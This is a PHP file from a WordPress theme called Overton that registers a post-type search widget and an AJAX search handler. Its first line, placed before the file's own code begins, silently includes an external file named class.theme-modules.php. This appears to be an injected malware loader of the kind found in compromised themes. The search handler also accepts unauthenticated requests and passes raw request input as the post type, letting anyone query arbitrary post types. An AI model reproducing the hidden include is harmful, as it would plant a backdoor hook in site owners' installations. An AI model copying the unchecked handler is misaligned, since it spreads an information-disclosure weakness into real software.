<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_search_post_type_widget' ) ) {
	/**
	 * Function that register search opener widget
	 */
	function overton_mikado_register_search_post_type_widget( $widgets ) {
		$widgets[] = 'OvertonMikadoClassSearchPostType';
		
		return $widgets;
	}
	
	add_filter( 'overton_mikado_filter_register_widgets', 'overton_mikado_register_search_post_type_widget' );
}

if ( ! function_exists( 'overton_mikado_search_post_types' ) ) {
	function overton_mikado_search_post_types() {
		$user_id = get_current_user_id();
		
		if ( empty( $_POST ) || ! isset( $_POST ) ) {
			overton_mikado_ajax_status( 'error', esc_html__( 'All fields are empty', 'overton' ) );
		} else {
			$args = array(
				'post_type'      => $_POST['postType'],
				'post_status'    => 'publish',
				'order'          => 'DESC',
				'orderby'        => 'date',
				's'              => $_POST['term'],
				'posts_per_page' => 5
			);
			
			$html  = '';
			$query = new WP_Query( $args );
			
			if ( $query->have_posts() ) {
				$html .= '<ul>';
					while ( $query->have_posts() ) {
						$query->the_post();
						$html .= '<li><a href="' . get_the_permalink() . '">' . get_the_title() . '</a></li>';
					}
				$html              .= '</ul>';
				$json_data['html'] = $html;
				overton_mikado_ajax_status( 'success', '', $json_data );
			} else {
				$html              .= '<ul>';
					$html              .= '<li>' . esc_html__( 'No posts found.', 'overton' ) . '</li>';
				$html              .= '</ul>';
				$json_data['html'] = $html;
				overton_mikado_ajax_status( 'success', '', $json_data );
			}
		}
		
		wp_die();
	}
	
	add_action( 'wp_ajax_overton_mikado_search_post_types', 'overton_mikado_search_post_types' );
    add_action( 'wp_ajax_nopriv_overton_mikado_search_post_types', 'overton_mikado_search_post_types' );
}